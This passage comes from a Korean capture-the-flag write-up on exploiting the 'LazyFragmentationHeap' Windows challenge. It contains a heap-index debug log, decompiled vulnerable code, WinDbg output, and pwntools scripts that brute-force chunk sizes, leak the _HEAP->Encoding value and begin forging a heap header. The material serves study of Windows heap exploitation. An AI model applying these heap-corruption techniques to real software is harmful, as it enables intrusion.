currIdx=0x0000000000000045
currIdx=0x0000000000000046
currIdx=0x0000000000000047
currIdx=0x0000000000000048
currIdx=0x0000000000000049
currIdx=0x000000000000004a
currIdx=0x000000000000004b
currIdx=0x000000000000004c
currIdx=0x000000000000004d
currIdx=0x000000000000004e
currIdx=0x000000000000004f
currIdx=0x0000000000000050
currIdx=0x0000000000000051
currIdx=0x0000000000000052
currIdx=0x0000000000000053
currIdx=0x0000000000000054
currIdx=0x0000000000000055
currIdx=0x0000000000000056
currIdx=0x0000000000000057
currIdx=0x0000000000000058
currIdx=0x0000000000000059
currIdx=0x000000000000005a
currIdx=0x000000000000005b
currIdx=0x000000000000005c
currIdx=0x000000000000005d
currIdx=0x000000000000005e
currIdx=0x000000000000005f
currIdx=0x0000000000000060
currIdx=0x0000000000000061
currIdx=0x0000000000000062
currIdx=0x0000000000000063
currIdx=0x0000000000000065
currIdx=0x0000000000000066
currIdx=0x0000000000000067
currIdx=0x0000000000000068
currIdx=0x0000000000000069
currIdx=0x000000000000006a
currIdx=0x000000000000006b
currIdx=0x000000000000006c
currIdx=0x000000000000006d
currIdx=0x000000000000006e
currIdx=0x000000000000006f
currIdx=0x0000000000000070
currIdx=0x0000000000000071
currIdx=0x0000000000000072
currIdx=0x0000000000000073
currIdx=0x0000000000000074
currIdx=0x0000000000000075
currIdx=0x0000000000000076
currIdx=0x0000000000000077
currIdx=0x0000000000000078
currIdx=0x0000000000000079
currIdx=0x000000000000007a
currIdx=0x000000000000007b
currIdx=0x000000000000007c
currIdx=0x000000000000007d
currIdx=0x000000000000007e
currIdx=0x000000000000007f
currIdx=0x0000000000000080
currIdx=0x0000000000000081
currIdx=0x0000000000000082
currIdx=0x0000000000000083
currIdx=0x0000000000000084
currIdx=0x0000000000000085
currIdx=0x0000000000000086
currIdx=0x0000000000000087
currIdx=0x0000000000000088
currIdx=0x0000000000000089
currIdx=0x000000000000008a
currIdx=0x000000000000008b
currIdx=0x000000000000008c
currIdx=0x000000000000008d
currIdx=0x000000000000008e
currIdx=0x000000000000008f
currIdx=0x0000000000000090
currIdx=0x0000000000000091
currIdx=0x0000000000000092
currIdx=0x0000000000000093
currIdx=0x0000000000000094
currIdx=0x0000000000000095
currIdx=0x0000000000000096
currIdx=0x0000000000000097
currIdx=0x0000000000000098
currIdx=0x0000000000000099
currIdx=0x000000000000009a
currIdx=0x000000000000009b
currIdx=0x000000000000009c
currIdx=0x000000000000009e
currIdx=0x000000000000009f
currIdx=0x00000000000000a0
currIdx=0x00000000000000a1
currIdx=0x00000000000000a2
currIdx=0x00000000000000a3
currIdx=0x00000000000000a4
currIdx=0x00000000000000a5
currIdx=0x00000000000000a6
currIdx=0x00000000000000a7
currIdx=0x00000000000000a8
currIdx=0x00000000000000a9
currIdx=0x00000000000000aa
currIdx=0x00000000000000ab
currIdx=0x00000000000000ac
currIdx=0x00000000000000ad
currIdx=0x00000000000000ae
currIdx=0x00000000000000af
currIdx=0x00000000000000b0
currIdx=0x00000000000000b1
currIdx=0x00000000000000b2
currIdx=0x00000000000000b3
currIdx=0x00000000000000b4
currIdx=0x00000000000000b5
currIdx=0x00000000000000b6
currIdx=0x00000000000000b7
currIdx=0x00000000000000b8
currIdx=0x00000000000000b9
currIdx=0x00000000000000ba
currIdx=0x00000000000000bb
currIdx=0x00000000000000bc
currIdx=0x00000000000000bd
currIdx=0x00000000000000be
currIdx=0x00000000000000bf
currIdx=0x00000000000000c0
currIdx=0x00000000000000c1
currIdx=0x00000000000000c2
currIdx=0x00000000000000c3
currIdx=0x00000000000000c4
currIdx=0x00000000000000c5
currIdx=0x00000000000000c6
currIdx=0x00000000000000c7
currIdx=0x00000000000000c8
currIdx=0x00000000000000c9
currIdx=0x00000000000000ca
currIdx=0x00000000000000cb
currIdx=0x00000000000000cc
currIdx=0x00000000000000cd
currIdx=0x00000000000000ce
currIdx=0x00000000000000cf
currIdx=0x00000000000000d0
currIdx=0x00000000000000d1
currIdx=0x00000000000000d2
currIdx=0x00000000000000d3
currIdx=0x00000000000000d4
currIdx=0x00000000000000d5
currIdx=0x00000000000000d7
currIdx=0x00000000000000d8
currIdx=0x00000000000000d9
currIdx=0x00000000000000da
currIdx=0x00000000000000db
currIdx=0x00000000000000dc
currIdx=0x00000000000000dd
currIdx=0x00000000000000de
currIdx=0x00000000000000df
currIdx=0x00000000000000e0
currIdx=0x00000000000000e1
currIdx=0x00000000000000e2
currIdx=0x00000000000000e3
currIdx=0x00000000000000e4
currIdx=0x00000000000000e5
currIdx=0x00000000000000e6
currIdx=0x00000000000000e7
currIdx=0x00000000000000e8
currIdx=0x00000000000000e9
currIdx=0x00000000000000ea
currIdx=0x00000000000000eb
currIdx=0x00000000000000ec
currIdx=0x00000000000000ed
currIdx=0x00000000000000ee
currIdx=0x00000000000000ef
currIdx=0x00000000000000f0
currIdx=0x00000000000000f1
currIdx=0x00000000000000f2
currIdx=0x00000000000000f3
currIdx=0x00000000000000f4
currIdx=0x00000000000000f5
currIdx=0x00000000000000f6
currIdx=0x00000000000000f7
currIdx=0x00000000000000f8
currIdx=0x00000000000000f9
currIdx=0x00000000000000fa
currIdx=0x00000000000000fb
currIdx=0x00000000000000fc
currIdx=0x00000000000000fd
currIdx=0x00000000000000fe
currIdx=0x00000000000000ff
currIdx=0x0000000000000000
currIdx=0x0000000000000001
currIdx=0x0000000000000002
currIdx=0x0000000000000003
currIdx=0x0000000000000067 &lt;--- here, @AmarSaar's vuln has been mitigated
currIdx=0x0000000000000068
currIdx=0x0000000000000069
currIdx=0x000000000000006a
currIdx=0x000000000000006b
currIdx=0x000000000000006c
currIdx=0x000000000000006d
currIdx=0x000000000000006e
currIdx=0x000000000000006f
currIdx=0x0000000000000070
currIdx=0x0000000000000071
currIdx=0x0000000000000073
currIdx=0x0000000000000074
currIdx=0x0000000000000075
currIdx=0x0000000000000076
currIdx=0x0000000000000077
*/</span>
</code></pre></div></div> <p>제가 LFH에 대해 학습한 내용은 여기까지입니다. 이제 문제파일을 분석해보겠습니다.</p> <h1 id="4-익스플로잇">4. 익스플로잇</h1> <p>아래와 같이 MENU 형식으로 입력을 받아 allocate, free, edit와 같은 동작을 수행할 수 있는 전형적인 Heap 문제로 보입니다.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*****************************
    LazyFragmentationHeap
*****************************
 1. Allocate buffer for File  // alloc
 2. Edit File content         // edit
 3. Show content              // show
 4. Clean content             // free
 5. LazyFileHandler
 6. Exit
****************************
</code></pre></div></div> <p>처음 문제파일을 시작하면 <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc()</a> 함수로 <strong>0xBEEFDAD0000</strong> 주소에 R/W 권한만 있는 메모리를 할당해 아래와 같은 40 bytes 크기의 구조체를 관리하는데 사용합니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">lazy_chunk</span> <span class="p">{</span>
    <span class="n">ULONGLONG</span> <span class="n">magic1</span><span class="p">;</span>    <span class="c1">// 0x0000DDAABEEF1ACD      | offset 0</span>
    <span class="n">ULONGLONG</span> <span class="n">size</span><span class="p">;</span>      <span class="c1">// 0x80 &lt;= size &lt;= 0x2000  | offset 8</span>
    <span class="n">ULONGLONG</span> <span class="n">chunk_id</span><span class="p">;</span>  <span class="c1">// 0xDDAA                  | offset 16</span>
    <span class="n">ULONGLONG</span> <span class="n">magic2</span><span class="p">;</span>    <span class="c1">// 0x0000DDAABEEF1ACD      | offset 24</span>
    <span class="n">BYTE</span> <span class="o">*</span><span class="n">heap_mem</span><span class="p">;</span>      <span class="c1">// calloc(1, size)         | offset 32</span>
<span class="p">}</span>
</code></pre></div></div> <p>처음 분석하고 나서 취약점이 있다고 의심이 간 부분은 <code class="language-plaintext highlighter-rouge">2. Edit File content</code>를 선택하면 실행하는 아래의 코드부분이었습니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">case</span> <span class="mi">2</span><span class="n">i64</span><span class="p">:</span>
<span class="c1">// skip for brevity...</span>
<span class="n">heap_mem_len</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="n">i64</span><span class="p">;</span>
<span class="n">heam_mem</span> <span class="o">=</span> <span class="n">BEEFDAD0000_mem</span><span class="p">[</span><span class="n">idx2_1</span><span class="p">].</span><span class="n">heap_mem</span><span class="p">;</span>
<span class="n">heap_size</span> <span class="o">=</span> <span class="n">BEEFDAD0000_mem</span><span class="p">[</span><span class="n">idx2_1</span><span class="p">].</span><span class="n">size</span><span class="p">;</span>
<span class="k">do</span>
  <span class="o">++</span><span class="n">heap_mem_len</span><span class="p">;</span>
<span class="k">while</span> <span class="p">(</span> <span class="n">heam_mem</span><span class="p">[</span><span class="n">heap_mem_len</span><span class="p">]</span> <span class="p">);</span>
<span class="k">if</span> <span class="p">(</span> <span class="n">heap_mem_len</span> <span class="o">&gt;</span> <span class="n">heap_size</span> <span class="o">&amp;&amp;</span> <span class="n">BEEFDAD0000_mem</span><span class="p">[</span><span class="n">idx2_1</span><span class="p">].</span><span class="n">magic2</span> <span class="o">==</span> <span class="mh">0xDDAABEEF1ACD</span><span class="n">i64</span> <span class="p">)</span>
<span class="p">{</span>  <span class="c1">// if magic2 is not corrupted, heap_size = heap_mem_len...OOB?</span>
  <span class="n">heap_size</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="n">i64</span><span class="p">;</span>
  <span class="k">do</span>
    <span class="o">++</span><span class="n">heap_size</span><span class="p">;</span>
  <span class="k">while</span> <span class="p">(</span> <span class="n">heam_mem</span><span class="p">[</span><span class="n">heap_size</span><span class="p">]</span> <span class="p">);</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">heam_mem</span><span class="p">,</span> <span class="n">heap_size</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span> <span class="c1">// potential OOB write</span>
<span class="c1">// skip for brevity...</span>

</code></pre></div></div> <p>주석으로 달아놓은 설명처럼 <code class="language-plaintext highlighter-rouge">heap_mem_len</code>을 이용한 OOB write가 가능해 보입니다.</p> <p><code class="language-plaintext highlighter-rouge">3. Show content</code>에도 아래와 같이 OOB read가 가능해보이는 코드가 있었습니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">case</span> <span class="mi">3</span><span class="n">i64</span><span class="p">:</span>
    <span class="c1">// skip for brevity...</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">BEEFDAD0000_mem</span><span class="p">[</span><span class="n">chunk_cnt</span><span class="p">].</span><span class="n">heap_mem</span> <span class="p">)</span>
        <span class="k">goto</span> <span class="n">LABEL_59</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">BEEFDAD0000_mem</span><span class="p">[</span><span class="n">chunk_cnt</span><span class="p">].</span><span class="n">magic1</span> <span class="o">!=</span> <span class="mh">0xDDAABEEF1ACD</span><span class="n">i64</span> <span class="p">)</span>
        <span class="k">goto</span> <span class="n">LABEL_59</span><span class="p">;</span>
    <span class="n">v26</span> <span class="o">=</span> <span class="n">BEEFDAD0000_mem</span><span class="p">[</span><span class="n">chunk_cnt</span><span class="p">].</span><span class="n">magic2</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v26</span> <span class="o">!=</span> <span class="mh">0xDDAABEEF1ACD</span><span class="n">i64</span> <span class="o">&amp;&amp;</span> <span class="n">v26</span> <span class="o">!=</span> <span class="mh">0xFACE6DA61A35C767</span><span class="n">i64</span> <span class="p">)</span>
        <span class="k">goto</span> <span class="n">LABEL_59</span><span class="p">;</span>

    <span class="c1">// potential OOB read, possible to leak _HEAP_ENTRY data</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Content: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">BEEFDAD0000_mem</span><span class="p">[</span><span class="n">chunk_cnt</span><span class="p">].</span><span class="n">heap_mem</span><span class="p">);</span> 
    <span class="c1">// skip for brevity...</span>
</code></pre></div></div> <p>그래서 OOB read로 뒤에 위치한 heap chunk의 ( <strong>_HEAP-&gt;Encoding</strong>로 인코딩된 ) header를 leak할 수 있는 size들을 찾기 위해 아래와 같이 Brute-force했습니다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># context.log_level = "debug"
</span>
<span class="c1"># HOST = "192.168.56.102" # VirtualBox Host-Only Adapter
</span><span class="n">HOST</span> <span class="o">=</span> <span class="s">"192.168.0.18"</span> <span class="c1"># VirtualBox Bridge 
</span><span class="n">PORT</span> <span class="o">=</span> <span class="mi">6677</span>

<span class="n">hi</span> <span class="o">=</span> <span class="bp">None</span>
<span class="n">sla</span> <span class="o">=</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
 	<span class="n">sla</span><span class="p">(</span><span class="s">"Size:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">val</span><span class="p">,</span> <span class="n">need_newline</span><span class="o">=</span><span class="bp">True</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
	<span class="k">if</span> <span class="n">need_newline</span><span class="p">:</span>
		<span class="n">sla</span><span class="p">(</span><span class="s">"Content:"</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">hi</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"Content:"</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
	<span class="k">return</span> <span class="n">hi</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">open_file</span><span class="p">():</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"ID:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">chunk_id</span><span class="p">))</span>
 	<span class="n">sla</span><span class="p">(</span><span class="s">"Size:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>

<span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">hi</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
<span class="n">sla</span> <span class="o">=</span> <span class="n">hi</span><span class="p">.</span><span class="n">sendlineafter</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">):</span>
	<span class="k">if</span> <span class="n">cnt</span> <span class="o">==</span> <span class="mi">10</span><span class="p">:</span> <span class="c1"># only 10 heap chunks can be allocated
</span>		<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"error"</span>
		<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
		<span class="n">hi</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
		<span class="n">hi</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
		<span class="n">sla</span> <span class="o">=</span> <span class="n">hi</span><span class="p">.</span><span class="n">sendlineafter</span>
		<span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span>
		<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"info"</span>

	<span class="n">alloc</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
	<span class="n">edit</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">i</span><span class="p">)</span>
	<span class="n">leak</span> <span class="o">=</span> <span class="n">show</span><span class="p">(</span><span class="n">i</span><span class="p">)[</span><span class="n">i</span><span class="p">:]</span>
	<span class="k">if</span> <span class="n">leak</span> <span class="o">!=</span> <span class="s">""</span><span class="p">:</span>
		<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span>
		<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"size 0x%04x can be usable to info leak( 0x%016x )"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">leak</span><span class="p">))</span>

	<span class="n">cnt</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="n">hi</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="s">'''
[+] Opening connection to 192.168.0.18 on port 6677: Done
[*] size 0x0088 can be usable to info leak( 0x00005de64b3b5de3 )
[*] size 0x0098 can be usable to info leak( 0x00005de54b3b5de3 )
[*] size 0x00a8 can be usable to info leak( 0x00005de44b3b5de3 )
[*] size 0x00b8 can be usable to info leak( 0x00005de34c3b5de4 )
[*] size 0x00c8 can be usable to info leak( 0x00005de24c3b5de4 )
[*] size 0x00d8 can be usable to info leak( 0x00002e9102b2a6f5 )
[*] size 0x00e8 can be usable to info leak( 0x00002e9012b2a6e5 )
[*] size 0x00f8 can be usable to info leak( 0x00002e8f02b2a6f5 )
[*] size 0x0108 can be usable to info leak( 0x00002e8e07b2a6f0 )
[*] size 0x0118 can be usable to info leak( 0x00002e8de5b3a613 )
[*] size 0x0128 can be usable to info leak( 0x0000ceb77fd0cded )
[*] size 0x0138 can be usable to info leak( 0x0000ceb027d0cdb5 )
[*] size 0x0148 can be usable to info leak( 0x0000ceb10dd0cd9f )
[*] size 0x0158 can be usable to info leak( 0x0000ceb2f9d0cd6b )
[*] size 0x0168 can be usable to info leak( 0x0000ceb3abd0cd39 )
[*] size 0x0178 can be usable to info leak( 0x00001fb485bbdffe )
[*] size 0x0188 can be usable to info leak( 0x00001fb5fbbbdf80 )
[*] size 0x0198 can be usable to info leak( 0x00001fb62fbbdf54 )
[*] size 0x01a8 can be usable to info leak( 0x00001fb761bbdf1a )
[*] size 0x01b8 can be usable to info leak( 0x00001fb059bbdf22 )
[*] size 0x01c8 can be usable to info leak( 0x0000b3a2b2d6edd0 )
[*] size 0x01d8 can be usable to info leak( 0x0000b3a1eed6ed8c )
[*] size 0x01e8 can be usable to info leak( 0x0000b3a028d6ed4a )
...
'''</span>
</code></pre></div></div> <p>디코딩된 header의 값은 항상 고정되어 있기 때문에 이를 이용해 <strong>_HEAP-&gt;Encoding</strong> 값을 leak할 수 있습니다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># skip for brevity...
</span>
<span class="n">SIZE</span> <span class="o">=</span> <span class="mh">0xC8</span>    <span class="c1"># yes, I intend korean slang
</span><span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">SIZE</span><span class="p">)</span>
<span class="n">heap_encod</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="n">SIZE</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00\x10</span><span class="s">"</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x1000000d02010003</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"_HEAP-&gt;Encoding = 0x%016x"</span> <span class="o">%</span> <span class="n">heap_encod</span><span class="p">)</span>
<span class="n">pause</span><span class="p">()</span>

<span class="s">'''
$ python ex.py
[+] Opening connection to 192.168.0.18 on port 6677: Done
[*] _HEAP-&gt;Encoding = 0x0000f300f8d50db2
[*] Paused (press any to continue)
....
0:001&gt; dqs beefdad0000 l5
00000bee`fdad0000  0000ddaa`beef1acd
00000bee`fdad0008  00000000`000000c8
00000bee`fdad0010  00000000`00000001
00000bee`fdad0018  face6da6`1a35c767
00000bee`fdad0020  000001e5`30874370
0:001&gt; !heap -p -a 000001e5`30874370
    address 000001e530874370 found in
    _HEAP @ 1e530870000
              HEAP_ENTRY Size Prev Flags            UserPtr UserSize - state
        000001e530874360 000d 0000  [00]   000001e530874370    000c8 - (busy)
          unknown!noop

0:001&gt; dqs 1e530870000+80 l2
000001e5`30870080  00000000`00000000
000001e5`30870088  0000f300`f8d50db2
'''</span>
</code></pre></div></div> <p>` 1. Allocate buffer for File`로 할당한 Heap chunk들은 LFH로 관리되지 않기 때문에, <strong>_HEAP-&gt;Encoding</strong>만 알고 있다면 OOB write 취약점을 사용해 header를 조작할 수 있습니다.</p> <p>이제 서로 인접한 heap chunk 2개를 할당해 header를 조작해줘야 하는데, 정확히 어떤 크기로 할당해줘야 서로 인접하게 할당되는지 알 수 없어 이부분도 header가 leak되는 걸 기준삼아 아래와 같이 Brute-Force해서 찾았습니다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># skip for brevity...
</span>
<span class="c1"># this takes too many times
# modify the Brute-Force range to use your instinct
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"i = 0x%04x"</span> <span class="o">%</span> <span class="n">i</span><span class="p">)</span>
	<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="mi">8</span><span class="o">*</span><span class="mi">8</span><span class="p">):</span>
		<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"j = 0x%04x"</span> <span class="o">%</span> <span class="n">j</span><span class="p">)</span>
		<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
		<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
		<span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">i</span><span class="p">)</span>
		<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
			<span class="n">tmp_sz</span> <span class="o">=</span> <span class="n">j</span> <span class="o">+</span> <span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="n">k</span><span class="p">)</span>
			<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="o">+</span><span class="n">k</span><span class="p">,</span> <span class="n">tmp_sz</span><span class="p">)</span>
			<span class="n">leak</span> <span class="o">=</span> <span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)[</span><span class="n">i</span><span class="p">:]</span>
			<span class="k">if</span> <span class="n">leak</span> <span class="o">!=</span> <span class="s">""</span><span class="p">:</span>
				<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"chunk1 size = 0x%x, chunk2 size = 0x%x"</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">tmp_sz</span><span class="p">))</span>
				<span class="k">break</span>

		<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"error"</span>
		<span class="n">sla</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
		<span class="n">hi</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
		<span class="n">hi</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
		<span class="n">sla</span> <span class="o">=</span> <span class="n">hi</span><span class="p">.</span><span class="n">sendlineafter</span>
		<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"info"</span>

<span class="s">'''
$ python ex.py
[+] Opening connection to 192.168.0.18 on port 6677: Done
[*] i = 0x0080
[*] j = 0x0080
[*] j = 0x00C0
[*] j = 0x0100
[*] j = 0x0140
....
[*] chunk1 size = 0x268, chunk2 size = 0x200
....
'''</span>
</code></pre></div></div> <p>이제 어떻게 크기를 할당해야 서로 인접한 chunk를 할당할 수 있는지 알았으니, <code class="language-plaintext highlighter-rouge">5. LazyFileHandler</code>로 <strong>magic.txt</strong>에서 읽어들인 값을 채워넣어 중간에 null-byte가 없게 한 뒤, OOB write 취약점을 사용해 header를 조작할 수 있습니다.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># skip for brevity...
</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"A"</span> <span class="o">*</span> <span class="n">SIZE</span><span class="p">)</span>
<span class="n">heap_encod</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)[</span><span class="n">SIZE</span><span class="p">:]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00\x10</span><span class="s">"</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x1000000d02010003</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"_HEAP-&gt;Encoding = 0x%016x"</span> <span class="o">%</span> <span class="n">heap_encod</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x268</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">)</span>

<span class="n">fake_entry</span> <span class="o">=</span> <span class="mh">0x10000027c80101c8</span> <span class="o">^</span> <span class="n">heap_encod</span>
<span class="s">'''
